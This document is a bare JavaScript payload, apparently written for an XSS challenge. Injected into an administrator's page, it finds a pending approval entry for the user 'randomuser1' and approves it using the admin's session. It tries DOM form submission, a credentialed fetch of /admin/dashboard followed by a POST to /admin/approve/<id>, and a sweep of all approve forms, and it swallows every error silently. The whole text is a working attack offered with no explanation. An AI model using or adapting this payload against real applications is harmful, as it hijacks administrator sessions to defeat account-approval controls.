(async ()=>{
  try {
    const my = "randomuser1"; // change if your username is different
    // 1) Try to find a visible approve <form> in the DOM and submit it
    try {
      let done=false;
      // look for text nodes with username, then search for forms near it
      const xpath = `//li[contains(., "${my}") or contains(., '${my}')]`;
      let nodes = document.evaluate(xpath, document, null, XPathResult.ORDERED_NODE_SNAPSHOT_TYPE, null);
      for (let i=0;i<nodes.snapshotLength;i++){
        let li = nodes.snapshotItem(i);
        // try find a form in the li
        let form = li.querySelector && (li.querySelector('form[action^="/admin/approve"]') || li.querySelector('form'));
        if (form){
          try { form.submit(); done=true; break; } catch(e){}
          // fallback: click the button
          let btn = form.querySelector && form.querySelector('button[type=submit]');
          if (btn){ btn.click(); done=true; break; }
        }
      }
      if (done) return;
    } catch(e){}
    // 2) If no DOM form found, fetch /admin/dashboard HTML and parse approve id
    try {
      let t = await (await fetch('/admin/dashboard', {credentials: 'same-origin'})).text();
      // find approve paths like /admin/approve/<uuid>
      let re = /\/admin\/approve\/([a-f0-9-]{8,36})/ig;
      let match;
      let chosen = null;
      while ((match = re.exec(t)) !== null){
        // check surrounding text includes our username
        let s = Math.max(0, match.index-200);
        let snippet = t.slice(s, match.index+200);
        if (snippet.indexOf(my) !== -1) { chosen = match[1]; break; }
        if (!chosen) chosen = match[1]; // fallback pick first
      }
      if (chosen){
        await fetch('/admin/approve/' + chosen, { method: 'POST', credentials: 'same-origin' });
        return;
      }
    } catch(e){}
    // 3) As last fallback, try enumerating all approve forms and submit those near username text
    try {
      document.querySelectorAll('form[action^="/admin/approve"]').forEach(f=>{
        if (f.innerText && f.innerText.includes(my)) {
          try{ f.submit(); }catch(e){ let b=f.querySelector('button'); if(b) b.click();}
        }
      });
    } catch(e){}
  } catch(e){}
})();
